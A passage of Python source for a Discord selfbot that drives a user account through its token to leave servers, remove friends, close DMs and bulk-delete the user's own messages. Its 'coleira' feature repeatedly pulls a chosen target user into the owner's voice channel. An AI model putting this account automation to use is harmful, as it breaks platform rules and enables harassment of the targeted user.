            return parse_comma_ids(values)

        out = set()
        for value in values:
            if value is None:
                continue
            sid = str(value).strip()
            if sid and sid != "0":
                out.add(sid)
        return out

    @staticmethod
    def _recipient_ids_from_channel(channel: dict | None) -> set[str]:
        if not isinstance(channel, dict):
            return set()

        recipient_ids = channel.get("recipient_ids")
        if isinstance(recipient_ids, list):
            return {str(rid).strip() for rid in recipient_ids if str(rid).strip()}

        recipients = channel.get("recipients", [])
        if not isinstance(recipients, list):
            return set()

        ids = set()
        for recipient in recipients:
            if not isinstance(recipient, dict):
                continue
            rid = str(recipient.get("id") or "").strip()
            if rid:
                ids.add(rid)
        return ids

    @staticmethod
    def _dm_channel_entry(channel: dict, fallback_name: str = "") -> dict:
        ch_id = str(channel.get("id") or "").strip()
        recipients = channel.get("recipients", [])
        recipient_ids = sorted(SelfBot._recipient_ids_from_channel(channel))

        if channel.get("type") == 1:
            if recipients:
                first = recipients[0]
                name = first.get("global_name") or first.get("username") or fallback_name
            else:
                name = fallback_name
        else:
            name = channel.get("name") or fallback_name or "Grupo sem nome"

        return {"id": ch_id, "name": name, "recipient_ids": recipient_ids}

    async def _channel_matches_excluded_user(self, channel: dict, excluded_user_ids: set[str]) -> tuple[bool, set[str]]:
        excluded_user_ids = self._normalize_id_set(excluded_user_ids)
        if not excluded_user_ids:
            return False, set()

        recipient_ids = self._recipient_ids_from_channel(channel)
        if not recipient_ids and channel.get("id"):
            fetched = await self.api_get_channel(channel["id"])
            recipient_ids = self._recipient_ids_from_channel(fetched)

        matched = recipient_ids & excluded_user_ids
        return bool(matched), matched

    async def wait_for_connection(self, timeout: float = 60.0) -> bool:
        """Aguarda reconexao apos queda de conexao. Retorna True se reconectou."""
        try:
            self._connected_event.clear()
            print(f"  {self._tag()} [i] Aguardando reconexao...")
            await asyncio.wait_for(self._connected_event.wait(), timeout=timeout)
            print(f"  {self._tag()} [ok] Reconectado!")
            return True
        except asyncio.TimeoutError:
            print(f"  {self._tag()} [!] Timeout esperando reconexao!")
            return False

    # HTTP helpers
    async def api_get(self, path: str, params: dict | None = None):
        if not self.session or self.session.closed:
            print("  [i] Sessao HTTP fechada em GET. Aguardando reconexao...")
            if await self.wait_for_connection(timeout=30):
                return await self.api_get(path, params)
            return None
        try:
            url = f"{API_BASE}{path}"
            async with self.session.get(url, headers=get_headers(self.token, with_content_type=False), params=params) as resp:
                if resp.status == 429:
                    data = await resp.json()
                    wait = data.get("retry_after", 5)
                    print(f"  [rate-limit] Esperando {wait:.2f}s...")
                    await asyncio.sleep(wait + 0.5)
                    return await self.api_get(path, params)
                if resp.status == 200:
                    return await resp.json()
                print(f"  [!] API GET {path} retornou status {resp.status}")
                try:
                    err_body = await resp.text()
                    if err_body:
                        print(f"  [!] Resposta: {err_body[:200]}")
                except Exception:
                    pass
                return None
        except (aiohttp.ClientError, asyncio.TimeoutError, RuntimeError) as e:
            print(f"  [!] Erro de conexao em GET {path}: {e}")
            if await self.wait_for_connection(timeout=30):
                return await self.api_get(path, params)
            return None

    async def api_delete(self, path: str):
        if not self.session or self.session.closed:
            print("  [i] Sessao HTTP fechada em DELETE. Aguardando reconexao...")
            if await self.wait_for_connection(timeout=30):
                return await self.api_delete(path)
            return False
        try:
            url = f"{API_BASE}{path}"
            async with self.session.delete(url, headers=get_headers(self.token)) as resp:
                if resp.status == 429:
                    data = await resp.json()
                    wait = data.get("retry_after", 5)
                    print(f"  [rate-limit] Esperando {wait:.2f}s...")
                    await asyncio.sleep(wait + 0.5)
                    return await self.api_delete(path)
                return resp.status in (200, 204)
        except (aiohttp.ClientError, asyncio.TimeoutError, RuntimeError) as e:
            print(f"  [warn] Erro de conexao em DELETE {path}: {e}")
            if await self.wait_for_connection(timeout=30):
                return await self.api_delete(path)
            return False

    async def api_delete_verbose(self, path: str, retries: int = 2):
        """Delete com retry e retorno detalhado (status, sucesso)."""
        for attempt in range(retries + 1):
            if not self.session or self.session.closed:
                print("  [i] Sessao HTTP fechada em DELETE verbose. Aguardando reconexao...")
                if await self.wait_for_connection(timeout=30):
                    continue
                return False, 0

            url = f"{API_BASE}{path}"
            try:
                async with self.session.delete(url, headers=get_headers(self.token)) as resp:
                    if resp.status == 429:
                        data = await resp.json()
                        wait = data.get("retry_after", 5)
                        print(f"  [rate-limit] Esperando {wait:.2f}s...")
                        await asyncio.sleep(wait + 0.5)
                        continue
                    if resp.status in (200, 204):
                        return True, resp.status

                    if attempt < retries and resp.status in (500, 502, 503):
                        print(f"  [warn] Erro {resp.status}, tentando novamente ({attempt+1}/{retries})...")
                        await asyncio.sleep(2)
                        continue
                    return False, resp.status
            except (aiohttp.ClientError, asyncio.TimeoutError, RuntimeError) as e:
                print(f"  [warn] Erro de conexao em DELETE {path}: {e}")
                if await self.wait_for_connection(timeout=30):
                    continue
                return False, 0

        return False, 0

    async def api_post(self, path: str, json_body: dict | None = None):
        if not self.session or self.session.closed:
            print("  [i] Sessao HTTP fechada em POST. Aguardando reconexao...")
            if await self.wait_for_connection(timeout=30):
                return await self.api_post(path, json_body)
            return None
        try:
            url = f"{API_BASE}{path}"
            async with self.session.post(url, headers=get_headers(self.token), json=json_body) as resp:
                if resp.status == 429:
                    data = await resp.json()
                    wait = data.get("retry_after", 5)
                    print(f"  [rate-limit] Esperando {wait:.2f}s...")
                    await asyncio.sleep(wait + 0.5)
                    return await self.api_post(path, json_body)
                if resp.status in (200, 201):
                    return await resp.json()
                return None
        except (aiohttp.ClientError, asyncio.TimeoutError, RuntimeError) as e:
            print(f"  [!] Erro de conexao em POST {path}: {e}")
            if await self.wait_for_connection(timeout=30):
                return await self.api_post(path, json_body)
            return None

    async def api_patch(self, path: str, json_body: dict | None = None):
        if not self.session or self.session.closed:
            print("  [i] Sessao HTTP fechada em PATCH. Aguardando reconexao...")
            if await self.wait_for_connection(timeout=30):
                return await self.api_patch(path, json_body)
            return None
        try:
            url = f"{API_BASE}{path}"
            async with self.session.patch(url, headers=get_headers(self.token), json=json_body) as resp:
                if resp.status == 429:
                    data = await resp.json()
                    wait = data.get("retry_after", 5)
                    print(f"  [rate-limit] Esperando {wait:.2f}s...")
                    await asyncio.sleep(wait + 0.5)
                    return await self.api_patch(path, json_body)
                if resp.status in (200, 204):
                    try:
                        return await resp.json()
                    except Exception:
                        return True
                return None
        except (aiohttp.ClientError, asyncio.TimeoutError, RuntimeError) as e:
            print(f"  [!] Erro de conexao em PATCH {path}: {e}")
            if await self.wait_for_connection(timeout=30):
                return await self.api_patch(path, json_body)
            return None

    async def api_get_channel(self, channel_id: str):
        """Busca informaAAes de um canal pela API."""
        return await self.api_get(f"/channels/{channel_id}")

    async def resolve_channel(self, target: str) -> str | None:
        """Resolve um alvo (channel ID ou user ID) para um channel ID.
        Se o target for um canal valido, retorna ele mesmo.
        Se for um user ID, abre/cria a DM e retorna o channel ID."""
        # Primeiro tenta como canal
        ch = await self.api_get_channel(target)
        if ch and ch.get("id"):
            return ch["id"]

        # Se nao e canal (404) ou sem acesso (403), tenta como user ID -> abre DM
        result = await self.api_post("/users/@me/channels", {"recipients": [target]})
        if result and result.get("id"):
            print(f"  [i] DM aberta com user {target} -> canal {result['id']}")
            return result["id"]

        print(f"  [!] Nao foi possivel resolver '{target}' como canal ou usuario.")
        return None

    # Farm Call (entrar/sair de canal de voz)
    async def join_voice_channel(self, channel_id: str, self_mute: bool = False, self_deaf: bool = False):
        """Entra em um canal de voz via Gateway (opcode 4)."""
        # Busca o guild_id do canal de voz
        channel_info = await self.api_get_channel(channel_id)
        if not channel_info:
            print(f"  [!] Nao foi possivel encontrar o canal {channel_id}")
            return False

        guild_id = channel_info.get("guild_id")
        if not guild_id:
            print(f"  [!] Canal {channel_id} nao pertence a nenhum servidor")
            return False

        channel_type = channel_info.get("type")
        # type 2 = voice, type 13 = stage
        if channel_type not in (2, 13):
            print(f"  [!] Canal {channel_id} nao e um canal de voz (type={channel_type})")
            return False

        channel_name = channel_info.get("name", "Desconhecido")

        # Envia Voice State Update (opcode 4)
        payload = {
            "op": 4,
            "d": {
                "guild_id": guild_id,
                "channel_id": channel_id,
                "self_mute": self_mute,
                "self_deaf": self_deaf,
            },
        }
        await self.ws.send_json(payload)

        self.voice_channel_id = channel_id
        self.voice_guild_id = guild_id

        mode = "[i] mute + deaf" if self_deaf else ("[i] mute" if self_mute else "[i] desmutado")
        print(f"  [i] Entrou no canal de voz: #{channel_name} ({channel_id}) -> {mode}")
        return True

    async def leave_voice_channel(self):
        """Sai do canal de voz atual via Gateway (opcode 4 com channel_id null)."""
        if not self.voice_guild_id:
            print("  [!] Nao esta em nenhum canal de voz.")
            return False

        payload = {
            "op": 4,
            "d": {
                "guild_id": self.voice_guild_id,
                "channel_id": None,
                "self_mute": False,
                "self_deaf": False,
            },
        }
        await self.ws.send_json(payload)

        print(f"  [i] Saiu do canal de voz ({self.voice_channel_id})")
        self.voice_channel_id = None
        self.voice_guild_id = None
        return True

    # Utilidades em Call
    async def get_voice_members(self, channel_id: str, guild_id: str, timeout: float = 5.0) -> list[dict]:
        """Retorna lista de membros em um canal de voz via Lazy Request (op 14)."""
        # Sempre solicita dados frescos via op 14
        try:
            self._voice_request_event = asyncio.Event()
            self._voice_request_channel = channel_id
            self._voice_members_cache[channel_id] = []
            payload = {
                "op": 14,
                "d": {
                    "guild_id": guild_id,
                    "typing": True,
                    "activities": True,
                    "threads": False,
                    "members": [],
                    "channels": {channel_id: [[0, 99]]},
                    "thread_member_lists": [],
                }
            }
            await self.ws.send_json(payload)
            try:
                await asyncio.wait_for(self._voice_request_event.wait(), timeout=timeout)
            except asyncio.TimeoutError:
                pass
            self._voice_request_event = None
            self._voice_request_channel = None
        except Exception:
            self._voice_request_event = None
            self._voice_request_channel = None
        return self._voice_members_cache.get(channel_id, [])

    async def get_guild_voice_channels(self, guild_id: str) -> list[dict]:
        """Retorna lista de canais de voz de uma guild."""
        channels = await self.api_get(f"/guilds/{guild_id}/channels")
        if not channels:
            return []
        # type 2 = voice, type 13 = stage
        return [ch for ch in channels if ch.get("type") in (2, 13)]

    def _known_guild_ids(self) -> list[str]:
        """Retorna guild IDs conhecidos pelo gateway/cache."""
        ids = []
        for guild in self.guilds:
            gid = guild.get("id") if isinstance(guild, dict) else None
            if gid and gid not in ids:
                ids.append(gid)
        for members in self._voice_members_cache.values():
            for member in members:
                gid = member.get("guild_id")
                if gid and gid not in ids:
                    ids.append(gid)
        return ids

    async def find_user_voice_location(self, user_id: str, guild_hint: str | None = None) -> tuple[str | None, str | None]:
        """Procura em qual call um usuario esta, usando cache e lazy member list."""
        guild_ids = self._known_guild_ids()
        if guild_hint:
            guild_ids = [guild_hint]
        if self.voice_guild_id and self.voice_guild_id in guild_ids:
            guild_ids.remove(self.voice_guild_id)
            guild_ids.insert(0, self.voice_guild_id)

        for guild_id in guild_ids:
            voice_channels = await self.get_guild_voice_channels(guild_id)
            if self._leash_running and user_id == self.user_id:
                self._leash_scan_count += 1
                if self._leash_scan_count == 1 or self._leash_scan_count % 3 == 0:
                    print(f"  {c.Y}[coleira]{c.X} Procurando sua call em {len(voice_channels)} canal(is) de voz...")
            for channel in voice_channels:
                ch_id = channel.get("id")
                if not ch_id:
                    continue
                members = await self.get_voice_members(ch_id, guild_id, timeout=1.0)
                if any(member.get("user_id") == user_id for member in members):
                    return ch_id, guild_id
                await asyncio.sleep(0.05)

        return None, None

    async def move_member(self, guild_id: str, user_id: str, channel_id: str) -> bool:
        """Move um membro para outro canal de voz."""
        result = await self.api_patch(
            f"/guilds/{guild_id}/members/{user_id}",
            {"channel_id": channel_id}
        )
        return result is not None

    async def move_member_verbose(self, guild_id: str, user_id: str, channel_id: str) -> tuple[bool, int, str]:
        """Move um membro e retorna status/mensagem para diagnosticar falhas."""
        if not self.session or self.session.closed:
            return False, 0, "sessao HTTP fechada"

        url = f"{API_BASE}/guilds/{guild_id}/members/{user_id}"
        try:
            async with self.session.patch(url, headers=get_headers(self.token), json={"channel_id": channel_id}) as resp:
                if resp.status == 429:
                    try:
                        data = await resp.json()
                        wait = data.get("retry_after", 5)
                    except Exception:
                        wait = 5
                    print(f"  [rate-limit] Esperando {wait:.2f}s...")
                    await asyncio.sleep(wait + 0.5)
                    return await self.move_member_verbose(guild_id, user_id, channel_id)

                if resp.status in (200, 204):
                    return True, resp.status, ""

                try:
                    data = await resp.json()
                    message = data.get("message", "")
                except Exception:
                    message = await resp.text()
                return False, resp.status, message[:180]
        except Exception as e:
            return False, 0, str(e)

    async def disconnect_member(self, guild_id: str, user_id: str) -> bool:
        """Desconecta um membro do canal de voz (move para null)."""
        result = await self.api_patch(
            f"/guilds/{guild_id}/members/{user_id}",
            {"channel_id": None}
        )
        return result is not None

    async def _leash_follow(self, channel_id: str, guild_id: str):
        """Move o alvo da coleira para o canal de voz do bot."""
        if not self._leash_running or not self._leash_target:
            return
        try:
            print(f"  {c.Y}[coleira]{c.X} Puxando {self._leash_target} para canal {channel_id}...")
            ok, status, message = await self.move_member_verbose(guild_id, self._leash_target, channel_id)
            if ok:
                print(f"  {c.GR}[coleira]{c.X} Usuario movido com sucesso!")
            else:
                detail = f" HTTP {status}" if status else ""
                if message:
                    detail += f" - {message}"
                print(f"  {c.R}[coleira]{c.X} Falha ao mover usuario.{detail}")
                print(f"  {c.Y}[coleira]{c.X} Verifique se o alvo esta em call e se sua conta tem permissao Mover Membros.")
            await asyncio.sleep(0.5)  # Delay para evitar rate limit
        except Exception as e:
            print(f"  {c.R}[coleira]{c.X} Erro: {e}")

    def stop_leash(self):
        """Desativa coleira e cancela monitor."""
        self._leash_running = False
        self._leash_target = None
        self._leash_last_channel_id = None
        self._leash_guild_id = None
        self._leash_scan_count = 0
        self._leash_pending_channel_id = None
        self._leash_pending_hits = 0
        if self._leash_monitor_task:
            self._leash_monitor_task.cancel()
            self._leash_monitor_task = None

    def start_leash(self, user_id: str, guild_id: str):
        """Ativa coleira em modo fixo por servidor."""
        if self._leash_monitor_task:
            self._leash_monitor_task.cancel()
        self._leash_target = user_id
        self._leash_running = True
        self._leash_last_channel_id = None
        self._leash_guild_id = guild_id
        self._leash_scan_count = 0
        self._leash_pending_channel_id = None
        self._leash_pending_hits = 0
        self._leash_monitor_task = asyncio.create_task(self._leash_monitor_loop())

    async def _leash_monitor_loop(self):
        """Monitora sua call quando voce muda pelo Discord normal."""
        print(f"  {c.Y}[coleira]{c.X} Monitor iniciado.")
        while self._leash_running and self._leash_target:
            try:
                channel_id, guild_id = await self.find_user_voice_location(self.user_id or "", self._leash_guild_id)
                if channel_id and guild_id:
                    self.voice_channel_id = channel_id
                    self.voice_guild_id = guild_id
                    if channel_id != self._leash_pending_channel_id:
                        self._leash_pending_channel_id = channel_id
                        self._leash_pending_hits = 1
                        await asyncio.sleep(1)
                        continue

                    self._leash_pending_hits += 1
                    if channel_id != self._leash_last_channel_id and self._leash_pending_hits >= 2:
                        self._leash_last_channel_id = channel_id
                        self._leash_pending_channel_id = None
                        self._leash_pending_hits = 0
                        await self._leash_follow(channel_id, guild_id)
                else:
                    self._leash_pending_channel_id = None
                    self._leash_pending_hits = 0
                    if self._leash_scan_count == 1 or self._leash_scan_count % 3 == 0:
                        print(f"  {c.Y}[coleira]{c.X} Ainda nao encontrei sua call.")
                await asyncio.sleep(4)
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"  {c.R}[coleira]{c.X} Erro no monitor: {e}")
                await asyncio.sleep(4)
        print(f"  {c.Y}[coleira]{c.X} Monitor parado.")

    # Sair de todos os servidores
    async def quit_all_servers(self, keep_server_ids: set[str] | None = None):
        """Sai de todos os servidores (guilds) da conta."""
        keep_server_ids = self._normalize_id_set(keep_server_ids)

        # Busca a lista atualizada de guilds
        guilds = await self.api_get("/users/@me/guilds")
        if not guilds:
            print("  [!] Nao foi possivel obter a lista de servidores.")
            return

        total = len(guilds)
        if total == 0:
            print("  [i]   Voce nao esta em nenhum servidor.")
            return

        print(f"\n[ok] Saindo de {total} servidor(es)...")
        if keep_server_ids:
            print(f"  [i] Mantendo servidor(es): {format_ids(keep_server_ids)}")
        left_count = 0
        kept_count = 0

        for i, guild in enumerate(guilds, 1):
            guild_id = guild["id"]
            guild_name = guild.get("name", "Desconhecido")
            is_owner = guild.get("owner", False)

            if guild_id in keep_server_ids:
                kept_count += 1
                print(f"  [i] [{i}/{total}] Mantido: {guild_name} ({guild_id})")
                continue

            if is_owner:
                # Se for dono, nao pode sair -> precisa deletar ou transferir
                print(f"  [!] [{i}/{total}] {guild_name} -> voce e o dono, pulando...")
                continue

            url = f"{API_BASE}/users/@me/guilds/{guild_id}"
            leave_body = {"lurking": False}

            async def _leave_guild():
                async with self.session.delete(url, headers=get_headers(self.token), json=leave_body) as resp:
                    if resp.status == 429:
                        data = await resp.json()
                        wait = data.get("retry_after", 5)
                        print(f"  [rate-limit] Esperando {wait:.2f}s...")
                        await asyncio.sleep(wait + 0.5)
                        return await _leave_guild()
                    return resp.status

            status = await _leave_guild()
            if status in (200, 204):
                left_count += 1
                print(f"  [ok] [{i}/{total}] Saiu de: {guild_name}")
            else:
                print(f"  [!] [{i}/{total}] Falha ao sair de: {guild_name} (status={status})")

            # Delay aleatorio para evitar rate-limit
            _qd = get_delay("quit_server")
            delay = random.uniform(_qd[0], _qd[1])
            await asyncio.sleep(delay)

        print(f"[ok] Concluido! Saiu de {left_count}/{total} servidor(es).\n")
        if kept_count:
            print(f"  [i] Servidor(es) mantido(s): {kept_count}\n")

    # Remover todos os amigos
    async def remove_all_friends(self, keep_user_ids: set[str] | None = None):
        """Remove todos os amigos da conta."""
        keep_user_ids = self._normalize_id_set(keep_user_ids)

        # GET /users/@me/relationships retorna todas as relacoes
        relationships = await self.api_get("/users/@me/relationships")
        if relationships is None:
            print("  [!] Nao foi possivel obter a lista de relacionamentos.")
            return

        # type 1 = amigo, type 3 = pedido enviado, type 4 = pedido recebido
        friends = [r for r in relationships if r.get("type") == 1]
        total = len(friends)

        if total == 0:
            print("  [i]   Voce nao tem nenhum amigo na lista.")
            return

        print(f"\n[ok] Removendo {total} amigo(s)...")
        if keep_user_ids:
            print(f"  [i] Mantendo amigo(s): {format_ids(keep_user_ids)}")
        removed_count = 0
        kept_count = 0

        for i, friend in enumerate(friends, 1):
            friend_id = friend["id"]
            friend_name = friend.get("user", {}).get("username", "Desconhecido")
            display_name = friend.get("user", {}).get("global_name") or friend_name

            if friend_id in keep_user_ids:
                kept_count += 1
                print(f"  [i] [{i}/{total}] Mantido amigo: {display_name} (@{friend_name})")
                continue

            url = f"{API_BASE}/users/@me/relationships/{friend_id}"

            async def _remove_friend(attempt_url=url):
                async with self.session.delete(attempt_url, headers=get_headers(self.token)) as resp:
                    if resp.status == 429:
                        data = await resp.json()
                        wait = data.get("retry_after", 5)
                        print(f"  [rate-limit] Esperando {wait:.2f}s...")
                        await asyncio.sleep(wait + 0.5)
                        return await _remove_friend(attempt_url)
                    return resp.status

            status = await _remove_friend()
            if status in (200, 204):
                removed_count += 1
                print(f"  [ok] [{i}/{total}] Removido: {display_name} (@{friend_name})")
            else:
                print(f"  [!] [{i}/{total}] Falha ao remover: {display_name} (@{friend_name}) (status={status})")

            # Delay aleatorio para evitar rate-limit
            _fd = get_delay("remove_friend")
            delay = random.uniform(_fd[0], _fd[1])
            await asyncio.sleep(delay)

        print(f"[ok] Concluido! Removeu {removed_count}/{total} amigo(s).\n")
        if kept_count:
            print(f"  [i] Amigo(s) mantido(s): {kept_count}\n")

    # Fechar todas as DMs (incluindo grupos)
    async def close_all_dms(self, excluded_user_ids: set[str] | None = None):
        """Fecha todas as DMs abertas e sai de todos os grupos."""
        excluded_user_ids = self._normalize_id_set(excluded_user_ids)

        channels = await self.api_get("/users/@me/channels")
        if channels is None:
            print(f"  {c.R}[x]{c.X} Erro ao buscar DMs.")
            return

        if not channels:
            print(f"  {BRANCO}[{AZUL}!{BRANCO}]{NC} Nenhuma DM ou grupo aberto.")
            return

        # Separa DMs normais e grupos
        dms = [ch for ch in channels if ch.get("type") == 1]       # DM normal
        groups = [ch for ch in channels if ch.get("type") == 3]    # Grupo DM
        total = len(dms) + len(groups)

        print(f"\n  {BRANCO}[{AZUL}*{BRANCO}]{NC} Encontrados: {len(dms)} DM(s) + {len(groups)} grupo(s) = {total} total")
        if excluded_user_ids:
            print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Mantendo chats com usuario(s): {format_ids(excluded_user_ids)}")
        print(f"  {BRANCO}[{AZUL}*{BRANCO}]{NC} Fechando todas as DMs e saindo dos grupos...\n")

        closed = 0
        left_groups = 0
        skipped = 0

        # Fechar DMs normais (DELETE /channels/{id})
        for i, dm in enumerate(dms, 1):
            recipients = dm.get("recipients", [])
            name = recipients[0].get("username", "") if recipients else ""
            ch_id = dm["id"]
            skip, matched_ids = await self._channel_matches_excluded_user(dm, excluded_user_ids)
            if skip:
                skipped += 1
                print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} [{i}/{total}] DM mantida: {name} ({format_ids(matched_ids)})")
                continue

            try:
                url = f"{API_BASE}/channels/{ch_id}"
                async with self.session.delete(url, headers=get_headers(self.token)) as resp:
                    if resp.status in (200, 204):
                        closed += 1
                        print(f"  {c.GR}[ok]{c.X} [{closed}/{total}] DM fechada: {name}")
                    else:
                        print(f"  {c.R}[x]{c.X} Erro ao fechar DM {name} (HTTP {resp.status})")
            except Exception as e:
                print(f"  {c.R}[x]{c.X} Erro: {e}")

            _cd = get_delay("close_dm")
            delay = random.uniform(_cd[0], _cd[1])
            await asyncio.sleep(delay)

        # Sair dos grupos (DELETE /channels/{id})
        for i, grp in enumerate(groups, 1):
            grp_name = grp.get("name") or "Grupo sem nome"
            if not grp.get("name"):
                recipients = grp.get("recipients", [])
                names = [r.get("username", "") for r in recipients[:3]]
                grp_name = ", ".join(names) if names else "Grupo sem nome"
            ch_id = grp["id"]
            current_index = len(dms) + i
            skip, matched_ids = await self._channel_matches_excluded_user(grp, excluded_user_ids)
            if skip:
                skipped += 1
                print(f"  {BRANCO}[{AZUL}i{BRANCO}]{NC} [{current_index}/{total}] Grupo mantido: {grp_name} ({format_ids(matched_ids)})")
                continue

            try:
                url = f"{API_BASE}/channels/{ch_id}"
                async with self.session.delete(url, headers=get_headers(self.token)) as resp:
                    if resp.status in (200, 204):
                        left_groups += 1
                        closed += 1
                        print(f"  {c.GR}[ok]{c.X} [{closed}/{total}] Saiu do grupo: {grp_name}")
                    else:
                        print(f"  {c.R}[x]{c.X} Erro ao sair do grupo {grp_name} (HTTP {resp.status})")
            except Exception as e:
                print(f"  {c.R}[x]{c.X} Erro: {e}")

            _cd = get_delay("close_dm")
            delay = random.uniform(_cd[0], _cd[1])
            await asyncio.sleep(delay)

        print(f"\n  [ok] Concluido! {closed - left_groups} DM(s) fechada(s), {left_groups} grupo(s) saiu.\n")
        if skipped:
            print(f"  [i] Chat(s) mantido(s) por excecao: {skipped}\n")

    # Limpeza de mensagens
    # Tipos de mensagem que podem ser apagadas pelo autor
    DELETABLE_MSG_TYPES = {0, 6, 19, 20, 23}
    #  0 = DEFAULT, 6 = PIN, 19 = REPLY, 20 = SLASH_CMD, 23 = CONTEXT_MENU

    async def _delete_message(self, channel_id: str, msg: dict, counter: int) -> bool:
        """Tenta apagar uma mensagem individual com log detalhado."""
        msg_id = msg['id']
        msg_type = msg.get("type", 0)

        # Pula mensagens do sistema (chamadas, adiAAes, etc.) -> nao podem ser apagadas
        if msg_type not in self.DELETABLE_MSG_TYPES:
            type_names = {1: "Adicao", 2: "Remocao", 3: "Chamada", 7: "Entrada",
                          8: "Boost", 9: "Boost T1", 10: "Boost T2", 11: "Boost T3"}
            name = type_names.get(msg_type, f"type={msg_type}")
            print(f"    Pulando msg sistema {msg_id} ({name})")
            return False

        success, status = await self.api_delete_verbose(f"/channels/{channel_id}/messages/{msg_id}")
        if success:
            content_preview = msg.get("content", "")[:50]
            if len(msg.get("content", "")) > 50:
                print(f"  [ok]  [{counter}] Apagada: \"{content_preview}...\"")
            else:
                print(f"  [ok]  [{counter}] Apagada: \"{content_preview}\"")
            return True
        else:
            content_preview = msg.get("content", "")[:30]
            if status == 404:
                print(f"  [!] Mensagem {msg_id} ja foi apagada")
                return True  # mensagem sumiu = progresso
            elif status == 403:
                print(f"  ai   Sem permissao {msg_id} (provavelmente msg do sistema)")
            else:
                print(f"  [!] Falha ao apagar {msg_id} (HTTP {status}): \"{content_preview}\"")
            return False

    async def purge_my_messages(self, channel_id: str):
        """Apaga suas mensagens no canal. Usa Search API para guild ou DM."""
        print(f"\n[i] Iniciando limpeza no canal {channel_id}...")

        # Verifica se e canal de guild para escolher o endpoint de search
        channel_info = await self.api_get_channel(channel_id)
        guild_id = channel_info.get("guild_id") if channel_info else None

        if guild_id:
            total = await self._purge_via_search(channel_id, guild_id)
        else:
            # Para DMs: tenta Search API do canal primeiro, depois fetch como fallback
            total = await self._purge_via_channel_search(channel_id)

        print(f"[ok] Limpeza concluida! {total} mensagem(ns) apagada(s).\n")
        return total

    async def _purge_via_search(self, channel_id: str, guild_id: str) -> int:
        """Apaga mensagens usando a Search API do Discord (muito mais eficiente para guilds)."""
        total_deleted = 0
        failed_ids = set()
        no_progress_rounds = 0
        empty_retries = 0  # vezes que o Indice retornou vazio mas total > 0
        offset = 0

        while True:
            params = {
                "author_id": self.user_id,
                "channel_id": channel_id,
                "include_nsfw": "true",
                "sort_by": "timestamp",
                "sort_order": "desc",
            }
            if offset > 0:
                params["offset"] = offset

            data = await self.api_get(f"/guilds/{guild_id}/messages/search", params)
            if not data:
                print("  [!] Search API falhou, tentando mAtodo alternativo...")
                return total_deleted + await self._purge_via_fetch(channel_id)

            total_results = data.get("total_results", 0)
            message_groups = data.get("messages", [])

            if total_results == 0:
                break

            # Indice stale: total > 0 mas sem resultados reais -> espera e tenta de novo
            if not message_groups:
                empty_retries += 1
                if empty_retries >= 5:
                    print(f"  [i]   Indice do Discord nao atualizou apos 5 tentativas.")
                    break
                print(f"  [i] Indice atualizando... ({total_results} restante(s)) aguardando... ({empty_retries}/5)")
                offset = 0
                await asyncio.sleep(5.0)
                continue
            empty_retries = 0

            print(f"  [i] Search API: {total_results} mensagem(ns) restante(s) (offset={offset}, ignoradas={len(failed_ids)})")

            hits = []
            for group in message_groups:
                for msg in group:
                    if msg.get("hit") and msg["author"]["id"] == self.user_id:
                        if msg["id"] not in failed_ids:
                            hits.append(msg)

            if not hits:
                no_progress_rounds += 1
                if no_progress_rounds >= 5:
                    break
                offset += 25
                await asyncio.sleep(get_delay_single("search"))
                continue

            deleted_this_round = 0
            skipped_this_round = 0

            for msg in hits:
                msg_type = msg.get("type", 0)
                if msg_type not in self.DELETABLE_MSG_TYPES:
                    failed_ids.add(msg["id"])
                    offset += 1
                    skipped_this_round += 1
                    type_names = {1: "Adicao", 2: "Remocao", 3: "Chamada", 7: "Entrada",
                                  8: "Boost", 9: "Boost T1", 10: "Boost T2", 11: "Boost T3"}
                    name = type_names.get(msg_type, f"type={msg_type}")
                    print(f"    Pulando msg sistema {msg['id']} ({name})")
                    continue

                success = await self._delete_message(channel_id, msg, total_deleted + 1)
                if success:
                    total_deleted += 1
                    deleted_this_round += 1
                else:
                    failed_ids.add(msg["id"])
                    offset += 1

                _dd = get_delay("delete_message")
                delay = random.uniform(_dd[0], _dd[1])
                await asyncio.sleep(delay)

            if deleted_this_round > 0 or skipped_this_round > 0:
                no_progress_rounds = 0
            else:
                no_progress_rounds += 1
                if no_progress_rounds >= 5:
                    print(f"  [!] Sem progresso em 5 rodadas, encerrando.")
                    break

            if len(failed_ids) >= total_results:
                print(f"  [i]   Todas as {total_results} mensagem(ns) restantes sAo do sistema.")
                break

            # Espera o Indice de busca do Discord atualizar
            await asyncio.sleep(get_delay_single("search") + 3.0)

        return total_deleted

    async def _purge_via_fetch(self, channel_id: str) -> int:
        """Apaga mensagens paginando pelo historico (fallback)."""
        total_deleted = 0
        last_message_id = None
        failed_ids = set()

        while True:
            params = {"limit": 100}
            if last_message_id:
                params["before"] = last_message_id

            messages = await self.api_get(f"/channels/{channel_id}/messages", params)
            if not messages or len(messages) == 0:
                break

            my_messages = [m for m in messages
                          if m["author"]["id"] == self.user_id
                          and m["id"] not in failed_ids
                          and m.get("type", 0) in self.DELETABLE_MSG_TYPES]

            for msg in my_messages:
                success = await self._delete_message(channel_id, msg, total_deleted + 1)
                if success:
                    total_deleted += 1
                else:
                    failed_ids.add(msg["id"])

                _dd = get_delay("delete_message")
                delay = random.uniform(_dd[0], _dd[1])
                await asyncio.sleep(delay)

            # Se veio menos de 100, chegou no fim do historico
            if len(messages) < 100:
                break

            last_message_id = messages[-1]["id"]
            await asyncio.sleep(get_delay_single("search"))

        return total_deleted

    async def _purge_via_channel_search(self, channel_id: str) -> int:
        """Apaga mensagens em DMs usando a Search API de canal."""
        total_deleted = 0
        failed_ids = set()       # IDs que nao podem ser apagados (sistema, sem permissao)
        no_progress_rounds = 0   # rounds sem nenhum progresso (nem delete nem skip novo)
        empty_retries = 0        # vezes que o Indice retornou vazio mas total > 0
        offset = 0

        while True:
            params = {
                "author_id": self.user_id,
                "include_nsfw": "true",
                "sort_by": "timestamp",
                "sort_order": "desc",
            }
            if offset > 0:
                params["offset"] = offset

            data = await self.api_get(f"/channels/{channel_id}/messages/search", params)
            if not data:
                print("  [!] Search API falhou, usando mAtodo alternativo (fetch)...")
                return total_deleted + await self._purge_via_fetch(channel_id)

            total_results = data.get("total_results", 0)
            message_groups = data.get("messages", [])

            if total_results == 0:
                break

            # Indice stale: total > 0 mas sem resultados reais -> espera e tenta de novo
            if not message_groups:
                empty_retries += 1
                if empty_retries >= 5:
                    print(f"  [i]   Indice do Discord nao atualizou apos 5 tentativas.")
                    break
